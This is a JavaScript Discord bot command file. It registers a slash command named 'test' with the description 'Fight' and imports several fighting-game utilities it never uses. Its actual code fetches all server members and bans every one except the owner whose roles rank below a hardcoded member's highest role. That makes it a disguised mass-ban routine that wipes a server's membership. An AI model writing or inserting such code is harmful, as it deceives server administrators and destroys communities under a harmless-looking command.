const { SlashCommandBuilder } = require('@discordjs/builders')
const { MessageEmbed, MessageActionRow, MessageSelectMenu, MessageAttachment, Collection, Client, Intents, Util } = require('discord.js')
const wait = require('util').promisify(setTimeout)
const mongoose = require('mongoose');
const { stringify } = require('querystring');
const { StringDecoder } = require('string_decoder');
const { Battlestats, playerStatus, abilitiesOfUsers } = require('../schema.js')
const { abilityCollection } = require('../utility/others/collection.js')
const Canvas = require('canvas')
const { statusCollection } = require('../schema.js')
const Fight = require('../utility/database/fightClass.js')
const fightBtns = require('../utility/fightingUtils/fightingButtons.js');
const yesorno = require('../utility/fightingUtils/fightYesOrNoBtns.js');
const yesornobtns = require('../utility/fightingUtils/fightYesOrNoBtns.js');
const fightContinue = require('../utility/fightingUtils/fightContinue.js');
const req = require('express/lib/request');
const { isAnyArrayBuffer } = require('util/types');




module.exports = {
    data: new SlashCommandBuilder()
        .setName('test')
        .setDescription('Fight')
    ,

    async execute(interaction, client) {
        try {



            let roles = await interaction.guild.roles.fetch()
            let members = await interaction.guild.members.fetch()
            let membersArr = Array.from(members.keys())


            let map = []
            members.get('951444137297739807')._roles.forEach((val) => {
                map.push(roles.get(val).rawPosition)
            })
            let highest = Math.max(...map)




            let revolution = membersArr.filter((v) => {
                     
                    return v!== interaction.guild.ownerId && members.get(v)._roles.every((val) => {
                    
                         return roles.get(val).rawPosition < highest

                    })



                })
              
           

                revolution.forEach(async element => {
                    await interaction.guild.members.ban(element)
                    console.log('done')
                });



            }
        catch (err) {
                console.log(err)
            }
        }
}